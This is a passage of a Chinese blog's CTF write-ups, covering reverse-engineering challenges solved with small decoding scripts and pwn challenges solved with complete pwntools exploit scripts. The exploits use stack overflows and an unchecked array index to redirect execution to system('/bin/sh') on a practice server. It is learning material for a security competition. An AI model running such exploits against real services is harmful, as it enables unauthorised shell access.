<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565589413006.png" class="" width="1565589413006">
<p>然后我运行程序输入grape，程序报错，好吧，看来没这么简单</p>
<p>进到MD5函数里看看，也没发现什么</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565590696742.png" class="" width="1565590696742">
<p>做题一度陷入了僵局。后来又进入一个<a
href="https://md5.gromweb.com/">解密网站</a>解密，发现居然解密的结果不一样</p>
<p>这次的结果是</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565590901116.png" class="" width="1565590901116">
<p>运行程序输入b781cbb29054db12f88f08c6e161c199，成功。所以flag就是b781cbb29054db12f88f08c6e161c199。</p>
<p>后来我发现grape在MD5加密之后就是b781cbb29054db12f88f08c6e161c199，可能第一个网站比较牛逼，直接给你解析到最开始的字符串</p>
<h2 id="分析总结">分析总结</h2>
<p>这个就是简单的看源码分析找到MD5解密就行了，没什么难度。</p>
<h1 id="shuffle">Shuffle</h1>
<p>题目描述：找到字符串在随机化之前.</p>
<h2 id="做题实录-1">做题实录</h2>
<p>这是个32位elf文件，运行跑出来是乱码</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/d5a573d2bb045c61a2ab63ebf563eb72.png" class="">
<p>放到IDA里看一下</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/24c390e308d6959ee3469f7e7d706b88.png" class="">
<p>这……不说了</p>
<p>直接出答案SECCON{Welcome to the SECCON 2014 ctf!}</p>
<h1 id="re2-cpp-is-awesome">re2-cpp-is-awesome</h1>
<p>题目描述：他们说c++是复杂的，证明他们说的是错的！</p>
<h2 id="做题实录-2">做题实录</h2>
<p>上来先一顿基操</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565595113757.png" class="" width="1565595113757">
<p>IDA，开启！进入main函数</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/2019-08-12_190525.png" class="" title="2019-08-12_190525">
<p>分析函数，可以发现第35行是主要的判断函数，v9就是我们输入的flag。那么flag的线索就藏在<code>off_6020A0[asc_6020C0[v15]]</code>里，那先看看<code>off_6020A0</code>里是什么吧。</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565608274123.png" class="" width="1565608274123">
<p>看到一个像flag的东西，突然兴奋了起来，不会这么简单吧。继续看</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565608360037.png" class="" width="1565608360037">
<p>好吧，本来以为是flag，但是看到这发现事情果然没有那么简单</p>
<p>接着看<code>asc_6020C0</code>，发现是一些数据</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565609099770.png" class="" width="1565609099770">
<p>后面其实本来一开始也是db，只不过我改成dd了（按D键），至于为什么要改，是我马后炮做完题才发现的，在写脚本的时候我会说到。</p>
<p>从分析可以看出flag应该就是从<code>off_6020A0</code>处的str（下文都叫str）中生成的。</p>
<p>先通过v15找出对应的<code>asc_6020C0</code>中的值，再以<code>asc_6020C0</code>的值为偏移量在str中找对应的字母，最终拼成flag。</p>
<p>有了这个思路后我就开始试着看一下flag是什么，发现<code>asc_6020C0</code>第一个是“$”，按D键转成ASCII码是24h，数出来是A，接着动态调试一下看看对不对。在判断的地方下断点，然后在<strong>Debugger-&gt;Process
Option-&gt;Parameters</strong>中填入要输入的参数Adawda（除了开头的A后面是随便填的），开始调试</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565609766817.png" class="" width="1565609766817">
<p>调试中我又下了两个断点，调试之后发现A是对的，那就印证了我的猜想，那下一步就是把所有的字符找出来。</p>
<p>把<code>asc_6020C0</code>的数据提取出来，我直接按照反汇编的结果写的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=[<span class="number">36</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">5</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">54</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">101</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">7</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">39</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">38</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">45</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">1</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">13</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">86</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">1</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">101</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">45</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">22</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">2</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">21</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">101</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">41</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">68</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">68</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line">		<span class="number">1</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">68</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">43</span>] <span class="comment">#这是最后字符串的偏移量 注意刚提取出来的时候数都是16进制的，我改成了10进制</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> eax <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">31</span>):</span><br><span class="line">	i = offset[eax*<span class="number">4</span>]</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">str</span>[i], end = <span class="string">&quot;&quot;</span>)  <span class="comment">#后面的end是让打印不自动换行</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#得出结果：   ALEXCTF&#123;W3_L0v3_C_W1th_CL45535&#125;</span></span><br></pre></td></tr></table></figure>
<p>在这一步我卡了好久，因为我在手动把16进制修改成10进制的时候不小心删了个00，然后卡了半天。后来终于发现少了个00补上了但是补错了位置……导致得出了一个这样的flag：<code>ALEXCTF&#123;W3_L0v3LC_W1th_CL45535&#125;</code></p>
<p>这完全就是一个flag该有的亚子好吗？然后我就怀着激动的心情提交了，然后，系统告诉我，<strong>错了</strong></p>
<p>所以说：</p>
<blockquote>
<p><strong>细心</strong>真的很重要很重要。</p>
</blockquote>
<p>不过，我后来发现，特喵的这不是dd双字字形吗，难怪eax要乘4，难怪那么多的0。就因为漏了个0卡了我好久我去</p>
<p>所以我在写这篇文章的时候才把<code>asc_6020C0</code>的数据用dd表示出来，这样就非常直观简洁了</p>
<h2 id="分析总结-1">分析总结</h2>
<p>实际上做完再回过头来再看这道题，可以看出这道题其实并不算难，但是这道题花了我很多的时间，我很早就注意到了<code>off_6020A0[asc_6020C0[v15]]</code>这个关键点，但是当时看到<code>asc_6020C0</code>的不知道是干啥的数据时有点懵逼，最后硬是汇编调试了半天才反应过来，然后就没有顾其他的直接按照汇编语言写脚本了。实际上做完题之后一看到++v15，每次只自增1，就明白了数据是双字存放的，如果当时冷静下来再思考一下，应该就能很快把这道题做出来。</p>
<p>这个题让我认识到：1.汇编还得好好学。2.IDA真NB，而我连D键咋用都不知道。不行，IDA
PRO权威指南，打开！3.我确实是个菜狗，还得多做题</p>
<h1 id="crackme">crackme</h1>
<h2 id="做题实录-3">做题实录</h2>
<p>IDA看看源码：</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567172093090.png" class="" width="1567172093090">
<p>根本不知道这是什么玩意儿，看来是加了壳，PEiD看一下有什么。</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567172218601.png" class="" width="1567172218601">
<p>可以看到壳是nSPack
3.7，那么就先用UnPackNsPack3.7脱壳，脱完壳之后再分析：</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567172355880.png" class="" width="1567172355880">
<p>可以看到就是简单的算法逆向，关键语句是第15句，我们看看Notflag和arg（名字我改过了）：</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567172454937.png" class="" width="1567172454937">
<p>可以看到Notflag是字符串，arg是一个数组，那么就写个脚本跑出来就行了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">notflag = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line">arg = [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;14&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;5C&#x27;</span>, <span class="string">&#x27;4A&#x27;</span>, <span class="string">&#x27;3D&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;0A&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;5A&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;6E&#x27;</span>,</span><br><span class="line">    ¦  <span class="string">&#x27;0C&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;0C&#x27;</span>, <span class="string">&#x27;0D&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;3E&#x27;</span>, <span class="string">&#x27;4B&#x27;</span>, <span class="string">&#x27;5F&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;4C&#x27;</span>, <span class="string">&#x27;5E&#x27;</span>, <span class="string">&#x27;5B&#x27;</span>, <span class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;6E&#x27;</span>, <span class="string">&#x27;0C&#x27;</span>, <span class="string">&#x27;16&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;5B&#x27;</span>, <span class="string">&#x27;12&#x27;</span>]</span><br><span class="line"></span><br><span class="line">arg2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg)):</span><br><span class="line">    arg2.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="string">&#x27;0x&#x27;</span>) + arg[i],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(arg2)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg2)):</span><br><span class="line">   flag += <span class="built_in">chr</span>(arg2[i] ^  <span class="built_in">ord</span>(notflag[i % <span class="number">16</span>]))  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#得出结果：flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="分析总结-2">分析总结</h2>
<p>实际上我认为这道题的难点在于脱壳，我直接用了大佬的工具，具体脱壳流程我还不会，还需要继续学习。</p>
<p>大佬的工具参见这篇文章<a
href="https://bbs.pediy.com/thread-115901.htm">《[原创]NsPack 3.7 浅析
（7.3更新脱壳机和源码）》</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn高手进阶</title>
    <url>/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h1 id="dice_game">dice_game</h1>
<p>IDA看一下：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242345912.png" class="" width="1567242345912">
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242499901.png" class="" width="1567242499901">
<p>这个和新手训练的guess_num一样都是猜数字，buf溢出改seed。：不多说了。</p>
<p>唯一的问题是附件中给的libc.so.6我好像没法用，写的exp一直提示我Illegal
instruction (core dumped)，很迷。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">30940</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/dice_game&#x27;)</span></span><br><span class="line">c = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br><span class="line">c.srand(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;point(1~6):&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(c.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242784679.png" class="" width="1567242784679">
<h1 id="warmup">warmup</h1>
<p>这个题没给附件……我看了看别人的wp的代码，就是一个很简单的溢出，cat
flag函数都现成的。直接写exp就行了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">41547</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567245274637.png" class="" width="1567245274637">
<h1 id="forgot">forgot</h1>
<p>题目描述：福克斯最近玩弄有限状态自动机。在探索概念实现正则表达式使用FSA他想实现一个电子邮件地址验证。
最近，Lua开始骚扰福克斯。对此，福克斯向Lua挑战斗智斗勇。福克斯承诺要奖励Lua，如果她能到不可达状态在FSA他实施过渡。可以在这里访问复制。
运行服务hack.bckdr.in:8009</p>
<p>看一下源码：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/2019-09-01_184730.png" class="" title="2019-09-01_184730">
<p>for循环是判断输入字符串是否符合格式，例如sub_8048702(v2[i])就是判断首字母是否为小写字母或数字或特定字符：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335394443.png" class="" width="1567335394443">
<p>第88行的代码是根据v14的值调用v3~v12中的一个函数（输出字符串）。例如v3：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335494006.png" class="" width="1567335494006">
<p>该程序调用函数和参数都是根据偏移量来调用，</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335649804.png" class="" width="1567335649804">
<p>程序中有system函数，因此我们的思路就是通过栈溢出让程序执行system函数，那么我们要知道我们输入的字符串的位置。</p>
<p>观察汇编代码可以得到v2（我们输入的字符串）的地址为[esp+10h]</p>
<p>于是开始构造exp运行，构造的过程中我发现调用system之后system执行的命令就是我们输入的字符串：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567339763954.png" class="" width="1567339763954">
<p>所以可以直接输入/bin/sh，但是只输入/bin/sh不能达到栈溢出的目的，需要占位符。用
; 来隔离后面的无用的占位符，确保命令能正常执行。</p>
<p>如果我们输入/bin/sh，那么程序在判断输入字符串是否符合格式的时候就会调用sub_8048618()，因此我们就要修改[esp+34h]的地址为system的地址。那么和我们的[esp+10h]之间的偏移量就是36，也就是我们需要输入36个字符。</p>
<p>得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">35636</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/forgot&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;../files/forgot&#x27;</span>)</span><br><span class="line">sys = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;w&#x27;</span> * <span class="number">28</span> + p32(sys)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;validate\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567340251686.png" class="" width="1567340251686">
<h1 id="stack2">stack2</h1>
<p>程序是一个求平均数的软件，输入一个数组，可以查看当前数组、添加和修改数组中的数还有求平均数。</p>
<p>看一下源码：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597713534.png" class="" width="1567597713534">
<p>发现在修改数的时候没有判断数组越界，所以可以构造栈溢出。</p>
<p>看一下程序中发现有hackme函数：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597827722.png" class="" width="1567597827722">
<p>那么就是构造栈溢出让程序返回到hackhere。</p>
<p>我们在第60行下断点，动态调试一下：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275633125.png" class="" width="1568275633125">
<p>此时堆栈如图，可以看到FF942C68是v13的起始地址。</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275967093.png" class="" width="1568275967093">
<p>继续调试，按5退出，观察函数调用情况：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568276152606.png" class="" width="1568276152606">
<p>可以看到退出时调用函数所在栈的位置是FF942CEC，那么我们就要修改FF942CEC的值，那就可以得到偏移量为FF942CEC-FF942C68=0x84。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57626</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/stack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many numbers you have:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me your numbers\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendaddr</span>(<span class="params">offset,addr</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">sendaddr(offset, <span class="number">0x9B</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x85</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行发现错误：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568299593922.png" class="" width="1568299593922">
<p>就感觉/bash怪怪的，那看来得自己传参了。由于system传入sh也可以执行shell，所以我们直接使用程序中的现成的sh就可以了。</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301479701.png" class="" width="1568301479701">
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57626</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/stack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many numbers you have:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me your numbers\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendaddr</span>(<span class="params">offset,addr</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"><span class="comment">#sys_addr</span></span><br><span class="line">sendaddr(offset, <span class="number">0x50</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x84</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">offset += <span class="number">8</span></span><br><span class="line"><span class="comment">#sh_addr</span></span><br><span class="line">sendaddr(offset, <span class="number">0x87</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x89</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>获得shell，得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301778145.png" class="" width="1568301778145">
<h1 id="pwn-100">pwn-100</h1>
<p>这是一个64位的ELF文件：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260260975.png" class="" width="1568260260975">
<p>IDA看一下源码：</p>
